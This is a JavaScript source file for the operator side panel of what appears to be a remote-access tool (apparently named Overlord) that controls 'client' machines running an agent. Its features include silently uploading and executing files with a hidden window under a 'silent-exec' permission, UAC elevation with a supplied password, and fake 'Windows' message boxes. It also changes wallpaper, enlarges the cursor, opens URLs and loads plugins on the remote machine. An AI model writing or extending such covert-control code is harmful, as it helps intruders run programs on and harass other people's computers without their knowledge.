        <div class="sp-rex-progress-meta" data-rex-activity-meta></div>
        <div class="sp-rex-activity-actions">
          <button type="button" class="sp-progress-action sp-progress-action-muted" data-rex-staging-cancel>Cancel upload</button>
        </div>
      </div>
      <div class="sp-rex-footer" data-rex-footer>
        <button type="button" class="sp-modal-btn sp-modal-btn-cancel" data-rex-close>Close</button>
        <button type="button" class="sp-modal-btn" data-rex-action="upload_only">Upload only</button>
        <button type="button" class="sp-modal-btn sp-modal-btn-confirm" data-rex-action="upload_and_run">Upload &amp; Run</button>
      </div>
    </div>
  `;

  const jobsById = new Map();
  const controllers = new Map();
  const dismissedIds = new Set();
  let uploadBusy = false;
  let stagingXhr = null;
  let listPollTimer = null;
  let destroyed = false;

  const fileInput = panel.querySelector("[data-rex-file]");
  const fileNameEl = panel.querySelector("[data-rex-file-name]");
  const listEl = panel.querySelector("[data-rex-file-list]");
  const activityEl = panel.querySelector("[data-rex-activity]");
  const activityLabel = panel.querySelector("[data-rex-activity-label]");
  const activityMeta = panel.querySelector("[data-rex-activity-meta]");
  const uploadSection = panel.querySelector("[data-rex-upload]");

  fileInput?.addEventListener("change", () => {
    const f = fileInput.files?.[0];
    if (fileNameEl) fileNameEl.textContent = f ? f.name : "No file selected";
  });

  const setUploadBusy = (value) => {
    uploadBusy = value;
    panel.classList.toggle("is-upload-busy", value);
    panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
      btn.disabled = value;
    });
    if (uploadSection) uploadSection.classList.toggle("is-dimmed", value);
  };

  const showStaging = (label, metaHtml) => {
    if (activityEl) activityEl.hidden = false;
    if (activityLabel) activityLabel.textContent = label;
    if (activityMeta) activityMeta.innerHTML = metaHtml || "";
  };

  const hideStaging = () => {
    if (activityEl) activityEl.hidden = true;
    if (activityMeta) activityMeta.innerHTML = "";
  };

  const stopListPoll = () => {
    if (listPollTimer) {
      clearTimeout(listPollTimer);
      listPollTimer = null;
    }
  };

  const scheduleListPoll = () => {
    stopListPoll();
    const needsPoll = [...jobsById.values()].some(
      (j) => j.status === "running" || j.status === "queued" || controllers.has(j.jobId),
    );
    if (!needsPoll || destroyed) return;
    listPollTimer = setTimeout(() => {
      void refreshJobList({ quiet: true });
    }, REMOTE_EXECUTE_POLL_MS);
  };

  function renderFileList() {
    if (!listEl) return;
    const jobs = sortRexJobs(
      [...jobsById.values()].filter((j) => !dismissedIds.has(j.jobId)),
    );
    if (!jobs.length) {
      listEl.innerHTML = `<p class="sp-help sp-rex-empty-hint">No staged files for this client yet.</p>`;
      return;
    }
    listEl.innerHTML = jobs.map((job) => renderRexJobRow(job, { controllers })).join("");
    bindRowActions();
  }

  function bindRowActions() {
    listEl.querySelectorAll("[data-rex-row-exec]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const jobId = btn.getAttribute("data-rex-row-exec");
        const job = jobsById.get(jobId);
        if (!job || controllers.has(jobId)) return;
        startExecute(jobId, job.originalName);
      });
    });
    listEl.querySelectorAll("[data-rex-row-discard]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const jobId = btn.getAttribute("data-rex-row-discard");
        void discardJob(jobId);
      });
    });
    listEl.querySelectorAll("[data-rex-row-cancel]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const jobId = btn.getAttribute("data-rex-row-cancel");
        const ctl = controllers.get(jobId);
        if (ctl?.cancel) void ctl.cancel();
        else void discardJob(jobId);
      });
    });
    listEl.querySelectorAll("[data-rex-row-dismiss]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const jobId = btn.getAttribute("data-rex-row-dismiss");
        dismissedIds.add(jobId);
        jobsById.delete(jobId);
        renderFileList();
      });
    });
  }

  async function refreshJobList({ quiet = false } = {}) {
    if (destroyed) return;
    try {
      const jobs = await fetchRexJobs(clientId);
      const next = new Map();
      for (const job of jobs) {
        if (!job?.jobId || dismissedIds.has(job.jobId)) continue;
        next.set(job.jobId, job);
      }
      // Keep optimistic running entries that controllers still own until server catches up
      for (const [id, ctlJob] of jobsById) {
        if (controllers.has(id) && !next.has(id)) next.set(id, ctlJob);
      }
      jobsById.clear();
      for (const [id, job] of next) jobsById.set(id, job);
      renderFileList();
      scheduleListPoll();
    } catch (err) {
      if (!quiet) {
        if (listEl && !jobsById.size) {
          listEl.innerHTML = `<p class="sp-help sp-rex-empty-hint rex-tone-err">${escapeHtml(err.message || "Failed to load staged files")}</p>`;
        }
      }
      scheduleListPoll();
    }
  }

  const readFormOptions = () => {
    const argsInput = panel.querySelector("[data-rex-args]");
    const hideInput = panel.querySelector("[data-rex-hide]");
    return {
      args: String(argsInput?.value || "").trim() || undefined,
      hideWindow: !!hideInput?.checked,
    };
  };

  async function discardJob(jobId) {
    if (!jobId) return;
    const ctl = controllers.get(jobId);
    if (ctl?.cancel) {
      await ctl.cancel();
      return;
    }
    try {
      await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
        method: "DELETE",
        credentials: "include",
      });
    } catch {
      /* best effort */
    }
    jobsById.delete(jobId);
    renderFileList();
    void refreshJobList({ quiet: true });
    showToast("Staged file discarded", "info");
  }

  function detachAllAndClose() {
    if (destroyed) return;
    destroyed = true;
    stopListPoll();
    if (stagingXhr) {
      try {
        stagingXhr.abort();
      } catch {
        /* ignore */
      }
      stagingXhr = null;
    }
    for (const ctl of controllers.values()) {
      try {
        ctl.detach?.();
      } catch {
        /* ignore */
      }
    }
    controllers.clear();
    if (panel._rexOnResize) window.removeEventListener("resize", panel._rexOnResize);
    panel.remove();
  }

  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
    btn.addEventListener("click", () => detachAllAndClose());
  });

  panel.querySelector("[data-rex-staging-cancel]")?.addEventListener("click", () => {
    if (stagingXhr) {
      try {
        stagingXhr.abort();
      } catch {
        /* ignore */
      }
      stagingXhr = null;
      hideStaging();
      setUploadBusy(false);
      showToast("Upload cancelled", "info");
    }
  });

  function startJobPoll(jobId, { displayName, onTerminal } = {}) {
    if (!jobId || controllers.has(jobId)) return;
    let pollTimer = null;
    let completed = false;
    let cancelling = false;
    let detached = false;

    const cleanup = () => {
      if (pollTimer) {
        clearTimeout(pollTimer);
        pollTimer = null;
      }
    };

    const finish = () => {
      cleanup();
      completed = true;
      controllers.delete(jobId);
      onTerminal?.();
      void refreshJobList({ quiet: true });
    };

    async function cancel() {
      if (completed || cancelling || detached) return;
      cancelling = true;
      cleanup();
      try {
        await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
          method: "DELETE",
          credentials: "include",
        });
      } catch {
        /* best effort */
      }
      jobsById.delete(jobId);
      finish();
      renderFileList();
      showToast("Remote execute cancelled", "info");
    }

    function detach() {
      if (completed || detached) return;
      detached = true;
      cleanup();
      controllers.delete(jobId);
      completed = true;
    }

    async function poll() {
      if (completed || detached || destroyed) return;
      try {
        const status = await fetchRexJob(clientId, jobId);
        if (completed || detached || destroyed) return;
        jobsById.set(jobId, status);
        renderFileList();

        if (status.status === "ready" || status.status === "succeeded" || status.status === "failed") {
          if (status.status === "succeeded") {
            showToast(`Executed successfully: ${displayName || status.originalName || "file"}`, "success", 5000);
          }
          if (status.status === "failed" && status?.error?.code === "cancelled") {
            jobsById.delete(jobId);
          }
          finish();
          return;
        }

        const interval =
          status.phase === "client_transfer" ? REMOTE_EXECUTE_TRANSFER_POLL_MS : REMOTE_EXECUTE_POLL_MS;
        pollTimer = setTimeout(() => void poll(), interval);
      } catch (err) {
        if (completed || detached) return;
        if (err.status === 404) jobsById.delete(jobId);
        finish();
        renderFileList();
        if (err.status !== 404) {
          showToast(err.message || "Remote execute failed", "error");
        }
      }
    }

    controllers.set(jobId, { cancel, detach });
    void poll();
  }

  function startExecute(jobId, displayName) {
    if (!jobId || controllers.has(jobId)) return;
    const opts = readFormOptions();
    const optimistic = {
      ...(jobsById.get(jobId) || { jobId, originalName: displayName }),
      status: "running",
      phase: "execute",
      percent: 10,
      updatedAt: Date.now(),
    };
    jobsById.set(jobId, optimistic);
    renderFileList();

    // Placeholder controller until poll starts
    let cancelledBeforeStart = false;
    controllers.set(jobId, {
      cancel: async () => {
        cancelledBeforeStart = true;
        controllers.delete(jobId);
        try {
          await fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}`, {
            method: "DELETE",
            credentials: "include",
          });
        } catch {
          /* ignore */
        }
        void refreshJobList({ quiet: true });
      },
      detach: () => {
        controllers.delete(jobId);
      },
    });

    const body = {};
    if (opts.args) body.args = opts.args;
    if (typeof opts.hideWindow === "boolean") body.hideWindow = opts.hideWindow;

    fetch(`/api/clients/${encodeURIComponent(clientId)}/remote-execute/${encodeURIComponent(jobId)}/execute`, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    })
      .then(async (res) => {
        const data = await res.json().catch(() => ({}));
        if (cancelledBeforeStart || destroyed) return;
        controllers.delete(jobId);
        if (!res.ok) {
          if (res.status === 404) {
            jobsById.delete(jobId);
            renderFileList();
            showToast(data.message || "Job expired - upload again", "error");
            return;
          }
          if (res.status === 409) {
            // Attach to whatever state the job is in
            startJobPoll(jobId, { displayName });
            void refreshJobList({ quiet: true });
            return;
          }
          showToast(data.message || `Execute failed: ${res.status}`, "error");
          void refreshJobList({ quiet: true });
          return;
        }
        if (data?.jobId) jobsById.set(jobId, data);
        startJobPoll(jobId, { displayName });
      })
      .catch((err) => {
        if (cancelledBeforeStart || destroyed) return;
        controllers.delete(jobId);
        showToast(err.message || "Failed to start execution", "error");
        void refreshJobList({ quiet: true });
      });
  }

  function startUpload(mode) {
    if (uploadBusy) return;
    const file = fileInput?.files?.[0];
    if (!file) {
      showToast("Select a file to upload", "error");
      return;
    }
    if (file.size <= 0) {
      showToast("File is empty", "error");
      return;
    }
    if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
      showToast(
        `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`,
        "error",
      );
      return;
    }

    const opts = readFormOptions();
    const formData = new FormData();
    formData.append("file", file);
    formData.append("mode", mode === "upload_only" ? "upload_only" : "upload_and_run");
    if (opts.args) formData.append("args", opts.args);
    if (opts.hideWindow) formData.append("hideWindow", "true");

    const xhr = new XMLHttpRequest();
    stagingXhr = xhr;
    setUploadBusy(true);
    showStaging(
      "Staging on server... 0%",
      `<div class="sp-progress-detail rex-tone-run">${escapeHtml(file.name)}</div>`,
    );

    xhr.upload.addEventListener("progress", (e) => {
      if (!e.lengthComputable || stagingXhr !== xhr) return;
      const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
      showStaging(
        `Staging on server... ${pct}%`,
        `<div class="sp-progress-detail rex-tone-run">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>`,
      );
    });

    xhr.addEventListener("load", () => {
      if (stagingXhr !== xhr) return;
      stagingXhr = null;
      setUploadBusy(false);
      hideStaging();
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          const res = JSON.parse(xhr.responseText);
          if (res.ok && res.jobId) {
            jobsById.set(res.jobId, res);
            renderFileList();
            startJobPoll(res.jobId, { displayName: file.name });
            void refreshJobList({ quiet: true });
            return;
          }
          showToast(res.message || "Remote execute failed", "error");
        } catch {
          showToast("Remote execute response was not valid JSON", "error");
        }
      } else {
        let msg = "Upload failed";
        try {
          msg = JSON.parse(xhr.responseText).message || msg;
        } catch {
          /* ignore */
        }
        if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
        showToast(msg, "error");
      }
    });

    xhr.addEventListener("error", () => {
      if (stagingXhr !== xhr) return;
      stagingXhr = null;
      setUploadBusy(false);
      hideStaging();
      showToast("Network error during upload", "error");
    });

    xhr.addEventListener("abort", () => {
      if (stagingXhr === xhr) stagingXhr = null;
      setUploadBusy(false);
      hideStaging();
    });

    xhr.open("POST", `/api/clients/${encodeURIComponent(clientId)}/remote-execute`);
    xhr.withCredentials = true;
    xhr.send(formData);
  }

  panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (btn.disabled || uploadBusy) return;
      const action = btn.getAttribute("data-rex-action");
      if (action === "upload_only" || action === "upload_and_run") startUpload(action);
    });
  });

  host.appendChild(panel);
  requestAnimationFrame(() => {
    applyRexPanelPosition(panel, host, clientId, loadRexPanelPos(clientId));
    enableRexPanelDrag(panel, host, clientId);
  });

  void refreshJobList().then(() => {
    // Auto-attach pollers for any running jobs already on server
    for (const job of jobsById.values()) {
      if ((job.status === "running" || job.status === "queued") && !controllers.has(job.jobId)) {
        startJobPoll(job.jobId, { displayName: job.originalName });
      }
    }
  });

  return panel;
}

function openRemoteExecuteModal(clientId) {
  createRemoteExecutePanel(clientId);
}


/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function closeSpModal(overlay) {
  if (overlay && overlay.parentNode) overlay.remove();
}

function createSpModal({ title, bodyHtml, confirmLabel = "Send", onReady }) {
  return new Promise((resolve) => {
    const overlay = document.createElement("div");
    overlay.className = "sp-modal-overlay";
    overlay.innerHTML = `
      <div class="sp-modal" role="dialog" aria-modal="true">
        <div class="sp-modal-header">
          <span class="sp-modal-title"></span>
          <button type="button" class="sp-modal-close" aria-label="Close">&times;</button>
        </div>
        <div class="sp-modal-body"></div>
        <div class="sp-modal-footer">
          <button type="button" class="sp-modal-btn sp-modal-btn-cancel">Cancel</button>
          <button type="button" class="sp-modal-btn sp-modal-btn-confirm"></button>
        </div>
      </div>
    `;
    overlay.querySelector(".sp-modal-title").textContent = title;
    overlay.querySelector(".sp-modal-body").innerHTML = bodyHtml;
    overlay.querySelector(".sp-modal-btn-confirm").textContent = confirmLabel;

    const finish = (value) => {
      closeSpModal(overlay);
      resolve(value);
    };

    overlay.querySelector(".sp-modal-close").addEventListener("click", () => finish(null));
    overlay.querySelector(".sp-modal-btn-cancel").addEventListener("click", () => finish(null));
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) finish(null);
    });
    const confirm = () => {
      const form = overlay.querySelector(".sp-modal-body");
      finish(form);
    };
    overlay.querySelector(".sp-modal-btn-confirm").addEventListener("click", confirm);
    overlay.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        finish(null);
        return;
      }
      if (e.key === "Enter" && e.target && e.target.tagName !== "TEXTAREA") {
        e.preventDefault();
        confirm();
      }
    });

    document.body.appendChild(overlay);
    if (typeof onReady === "function") onReady(overlay);
    const firstInput = overlay.querySelector("input, textarea, select, button");
    if (firstInput) firstInput.focus();
  });
}

function normalizeClientUrl(raw) {
  const value = String(raw || "").trim();
  if (!value) return { ok: false, error: "URL is required" };
  if (value.length > 2048) return { ok: false, error: "URL is too long" };

  let candidate = value;
  if (candidate.startsWith("//")) {
    candidate = `https:${candidate}`;
  } else {
    const bareScheme = candidate.match(/^(https?):(?!\/\/)(.+)$/i);
    if (bareScheme) {
      candidate = `${bareScheme[1].toLowerCase()}://${bareScheme[2]}`;
    } else if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
      candidate = `https://${candidate}`;
    }
  }

  try {
    const parsed = new URL(candidate);
    const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
    if (scheme !== "http" && scheme !== "https") {
      return { ok: false, error: "Only http and https URLs are allowed" };
    }
    if (!parsed.hostname) return { ok: false, error: "Invalid URL" };
    return { ok: true, url: parsed.toString() };
  } catch {
    return { ok: false, error: "Invalid URL" };
  }
}

async function openOpenUrlModal(clientId) {
  const body = await createSpModal({
    title: "Open URL",
    confirmLabel: "Open",
    bodyHtml: `
      <label class="sp-field">
        <span>URL</span>
        <input type="text" class="sp-input" data-sp-url placeholder="www.example.com or https://..." autocomplete="off" spellcheck="false" />
      </label>
      <p class="sp-hint">Opens in the client's default browser. Accepts www., http://, https://. Press Enter to open.</p>
    `,
  });
  if (!body) return;

  const raw = body.querySelector("[data-sp-url]")?.value || "";
  const normalized = normalizeClientUrl(raw);
  if (!normalized.ok) {
    showToast(normalized.error, "error");
    return;
  }

  showToast(`Opening ${normalized.url}â€¦`, "info", 2500);
  try {
    const result = await sendCommand(clientId, "open_url", { url: normalized.url });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Open URL failed", "error");
      return;
    }
    showToast(`Opened ${normalized.url}`, "success");
  } catch (err) {
    showToast(err.message || "Open URL failed", "error");
  }
}

async function openMessageBoxModal(clientId) {
  const body = await createSpModal({
    title: "Message Box",
    confirmLabel: "Show",
    bodyHtml: `
      <label class="sp-field">
        <span>Title</span>
        <input type="text" class="sp-input" data-sp-title value="Windows" maxlength="256" />
      </label>
      <label class="sp-field">
        <span>Message</span>
        <textarea class="sp-input sp-textarea" data-sp-text rows="3" maxlength="2048" placeholder="Something went wrong..."></textarea>
      </label>
      <fieldset class="sp-field sp-icon-field">
        <legend>Icon</legend>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="error" /> Error</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="warning" /> Warning</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="info" checked /> Info</label>
        <label class="sp-radio"><input type="radio" name="sp-msg-icon" value="question" /> Question</label>
      </fieldset>
    `,
  });
  if (!body) return;

  const title = (body.querySelector("[data-sp-title]")?.value || "").trim() || "Windows";
  const text = (body.querySelector("[data-sp-text]")?.value || "").trim();
  const icon = body.querySelector('input[name="sp-msg-icon"]:checked')?.value || "info";
  if (!text) {
    showToast("Message text is required", "error");
    return;
  }

  showToast("Showing message boxâ€¦", "info", 2500);
  try {
    const result = await sendCommand(clientId, "message_box", { title, text, icon });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Message box failed", "error");
      return;
    }
    showToast("Message box shown on client", "success");
  } catch (err) {
    showToast(err.message || "Message box failed", "error");
  }
}

async function openBigMouseModal(clientId) {
  const body = await createSpModal({
    title: "Big Mouse",
    confirmLabel: "Apply",
    bodyHtml: `
      <label class="sp-field">
        <span>Duration (seconds)</span>
        <input type="number" class="sp-input" data-sp-duration min="5" max="300" value="30" step="1" />
      </label>
      <div class="sp-field sp-icon-field" style="display:flex;gap:8px;flex-wrap:wrap">
        <button type="button" class="sp-modal-btn" data-sp-preset="15">15s</button>
        <button type="button" class="sp-modal-btn" data-sp-preset="30">30s</button>
        <button type="button" class="sp-modal-btn" data-sp-preset="60">60s</button>
      </div>
      <p class="sp-hint">Maximizes the Windows cursor size, then restores automatically. Windows only.</p>
    `,
    onReady(overlay) {
      const input = overlay.querySelector("[data-sp-duration]");
      for (const btn of overlay.querySelectorAll("[data-sp-preset]")) {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          if (input) input.value = btn.getAttribute("data-sp-preset") || "30";
        });
      }
    },
  });
  if (!body) return;

  const durationSec = Math.floor(Number(body.querySelector("[data-sp-duration]")?.value || 30));
  if (!Number.isFinite(durationSec) || durationSec < 5 || durationSec > 300) {
    showToast("Duration must be 5â€“300 seconds", "error");
    return;
  }

  showToast(`Making cursor huge for ${durationSec}sâ€¦`, "info", 2500);
  try {
    const result = await sendCommand(clientId, "cursor_big", { durationSec });
    if (result && result.ok === false) {
      showToast(result.error || result.message || "Big mouse failed", "error");
      return;
    }
    showToast(result?.message || `Big mouse applied for ${durationSec}s`, "success");
  } catch (err) {
    showToast(err.message || "Big mouse failed", "error");
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Action handler                                             */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function handleAction(clientId, action) {
  playClickSound();
  try {
    switch (action) {
      case "ping":
        await sendCommand(clientId, "ping");
        showToast("Ping sent", "success");
        break;

      case "reconnect":
        await sendCommand(clientId, "reconnect");
        showToast("Reconnect signal sent", "success");
        break;

      case "disconnect": {
        if (!confirm("Disconnect this client?")) return;
        await sendCommand(clientId, "disconnect");
        showToast("Client disconnected", "success");
        break;
      }

      case "uninstall": {
        if (!confirm("Uninstall the agent from this client? This cannot be undone.")) return;
        await sendCommand(clientId, "uninstall");
        showToast("Uninstall command sent", "success");
        break;
      }

      case "elevate": {
        const password = prompt("UAC password (leave blank for none):");
        if (password === null) return;
        await sendCommand(clientId, "elevate", { password });
        showToast("Elevate command sent", "success");
        break;
      }

      case "set-nickname": {
        const nickname = prompt("Enter new nickname (blank to clear):");
        if (nickname === null) return;
        await patchClient(clientId, "nickname", nickname);
        showToast(nickname ? `Nickname set to "${nickname}"` : "Nickname cleared", "success");
        break;
      }

      case "wallpaper":
        triggerWallpaperUpload(clientId);
        break;

      case "remote-execute":
        openRemoteExecuteModal(clientId);
        break;

      case "open-url":
        openOpenUrlModal(clientId);
        break;

      case "message-box":
        openMessageBoxModal(clientId);
        break;

      case "big-mouse":
        openBigMouseModal(clientId);
        break;

      default:
        showToast(`Unknown action: ${action}`, "error");
    }
  } catch (err) {
    showToast(err.message || "Action failed", "error");
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Dynamic sections (scripts & plugins)                       */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function loadScripts() {
  try {
    const res = await fetch("/api/saved-scripts", { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.scripts || [];
  } catch {
    return [];
  }
}

async function loadPlugins(clientId) {
  try {
    const res = await fetch(`/api/clients/${clientId}/plugins`, { credentials: "include" });
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data) ? data : data.plugins || [];
  } catch {
    return [];
  }
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  DOM builder                                                */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function buildPanel(clientId) {
  const panel = document.createElement("div");
  panel.className = "sp-inner";

  const home = document.createElement("a");
  home.className = "sp-item sp-home";
  home.href = "/";
  home.title = "Clients";
  home.innerHTML = `<i class="fa-solid fa-house" style="color:#818cf8"></i><span>Clients</span>`;
  panel.appendChild(home);

  /* ---- Static groups ---- */
  for (const group of PANEL_GROUPS) {
    const section = document.createElement("div");
    section.className = "sp-group";
    section.dataset.group = group.id;

    /* Toggle header */
    const toggle = document.createElement("button");
    toggle.className = "sp-group-toggle";
    toggle.type = "button";
    if (group.emoji) {
      toggle.innerHTML = `<span class="sp-group-emoji">${group.emoji}</span><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    } else {
      toggle.innerHTML = `<i class="${group.icon} sp-group-icon" style="color:${group.color}"></i><span class="sp-group-label">${group.label}</span><i class="fa-solid fa-chevron-right sp-chevron"></i>`;
    }
    toggle.title = group.label;
    toggle.addEventListener("click", () => {
      const rail = section.closest(".side-panel")?.classList.contains("is-collapsed");
      if (rail) {
        section.classList.toggle("is-rail-open");
        section.classList.toggle("is-open", section.classList.contains("is-rail-open"));
        return;
      }
      section.classList.toggle("is-open");
    });
    section.appendChild(toggle);

    /* Items container */
    const items = document.createElement("div");
    items.className = "sp-group-items";

    for (const item of group.items) {
      if (item.divider) {
        const hr = document.createElement("hr");
        hr.className = "sp-divider";
        items.appendChild(hr);
        continue;
      }

      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.title = item.label;
      btn.innerHTML = `<i class="${item.icon}" style="color:${item.color}"></i><span>${item.label}</span>`;

      if (item.open === "files") {
        btn.addEventListener("click", () => openFileBrowserWindow(clientId));
      } else if (item.open === "files-classic") {
        btn.addEventListener("click", () => openFileBrowserWindow(clientId, "classic"));
      } else if (item.open === "soundboard-remote") {
        btn.addEventListener("click", () => {
          const url = resolveOpenUrl(clientId, item.open);
          if (url) {
            window.open(
              url,
              `overlord-soundboard-${clientId}`,
              "width=420,height=640,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes",
            );
          }
        });
      } else if (item.open) {
        btn.addEventListener("click", () => {
          const url = resolveOpenUrl(clientId, item.open);
          if (url) window.open(url, "_blank");
        });
      } else if (item.action) {
        btn.addEventListener("click", () => handleAction(clientId, item.action));
      }

      items.appendChild(btn);
    }

    section.appendChild(items);
    panel.appendChild(section);
  }

  /* ---- Dynamic: Run Script ---- */
  const scriptSection = document.createElement("div");
  scriptSection.className = "sp-group sp-dynamic-section";
  scriptSection.dataset.group = "scripts";
  scriptSection.style.display = "none";
  scriptSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-code sp-group-icon" style="color:#a78bfa"></i>
      <span class="sp-group-label">Run Script</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-script-items"></div>
  `;
  scriptSection.querySelector(".sp-group-toggle").addEventListener("click", () => scriptSection.classList.toggle("is-open"));
  panel.appendChild(scriptSection);

  /* ---- Dynamic: Plugins ---- */
  const pluginSection = document.createElement("div");
  pluginSection.className = "sp-group sp-dynamic-section";
  pluginSection.dataset.group = "plugins";
  pluginSection.style.display = "none";
  pluginSection.innerHTML = `
    <button class="sp-group-toggle" type="button">
      <i class="fa-solid fa-puzzle-piece sp-group-icon" style="color:#fb923c"></i>
      <span class="sp-group-label">Plugins</span>
      <i class="fa-solid fa-chevron-right sp-chevron"></i>
    </button>
    <div class="sp-group-items" id="sp-plugin-items"></div>
  `;
  pluginSection.querySelector(".sp-group-toggle").addEventListener("click", () => pluginSection.classList.toggle("is-open"));
  panel.appendChild(pluginSection);

  /* ---- Populate dynamic sections ---- */
  loadScripts().then((scripts) => {
    if (!scripts.length) return;
    scriptSection.style.display = "";
    const container = scriptSection.querySelector("#sp-script-items");
    for (const script of scripts) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-scroll" style="color:#c4b5fd"></i><span>${escapeHtml(script.name || script.title || "Script")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/scripts?clientId=${clientId}&scriptId=${script.id}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  loadPlugins(clientId).then((plugins) => {
    if (!plugins.length) return;
    pluginSection.style.display = "";
    const container = pluginSection.querySelector("#sp-plugin-items");
    for (const plugin of plugins) {
      const btn = document.createElement("button");
      btn.className = "sp-item";
      btn.type = "button";
      btn.innerHTML = `<i class="fa-solid fa-plug" style="color:#fdba74"></i><span>${escapeHtml(plugin.name || "Plugin")}</span>`;
      btn.addEventListener("click", () => {
        window.open(`/plugins/${plugin.id}?clientId=${clientId}`, "_blank");
      });
      container.appendChild(btn);
    }
  });

  return panel;
}

function escapeHtml(str) {
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Public init                                                */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

export function initSidePanel(clientId, containerEl) {
  if (!clientId || !containerEl) return;
  containerEl.appendChild(buildPanel(clientId));
}
